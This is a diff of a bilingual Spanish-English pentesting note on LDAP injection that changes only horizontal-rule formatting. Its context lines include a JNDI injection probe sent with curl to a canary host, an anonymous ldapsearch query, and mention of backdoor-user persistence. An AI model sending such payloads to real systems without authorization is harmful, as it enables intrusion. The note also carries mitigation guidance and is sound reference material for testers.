@@ -31,7 +31,7 @@ linked:
 ---
 # LDAP Injection
 
-***
+---
 
 ## Cheatsheet
 
@@ -115,7 +115,7 @@ tab: **Wordlists y Resources**
 ![[LDAP Injection - Tooling#^ldap-tool-wordlists]]
 ````
 
-___
+---
 
 ## Overview
 
@@ -159,7 +159,7 @@ filterlist     = filter+
 | Common impact | Data extraction, RCE | Auth bypass, data extraction, JNDI RCE |
 | Tooling | `sqlmap` | `ldap3`, custom scripts |
 
-___
+---
 
 ## Workflow de explotación
 
@@ -203,7 +203,7 @@ ___
    - Combine con AD attack tools (Impacket, BloodHound)
 ```
 
-___
+---
 
 ## Detección rápida
 
@@ -264,7 +264,7 @@ curl -H 'User-Agent: ${jndi:ldap://canary.oast.fun/x}' https://target/
 ldapsearch -H ldap://target -x -s base -b ""
 ```
 
-___
+---
 
 ## Impacto
 
@@ -279,7 +279,7 @@ ___
 - **Persistence** — LDIF injection crea backdoor user/group.
 - **Schema disruption** — modify schema si admin compromised.
 
-___
+---
 
 ## Mitigación (defender)
 
@@ -304,7 +304,7 @@ ___
 - **Schema validation** — input types enforce.
 - **Rate limit + monitoring** — detect enumeration attempts.
 
-___
+---
 
 ## Para entender LDAP Injection
 
@@ -335,7 +335,7 @@ App típica:
 
 Inyección en step 2 search puede retornar admin's DN para step 3 bind con own password — pero no funciona porque pass del admin no controlada. Pero si filter retorna multiple → app puede bind con first match (admin) en algunos impl.
 
-___
+---
 
 ## Recursos
 
@@ -350,4 +350,4 @@ ___
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound) — AD enumeration post-LDAP.
 - [Active Directory Attack Resources](https://github.com/Orange-Cyberdefense/arsenal) — combined toolkit.
 
-***
+---
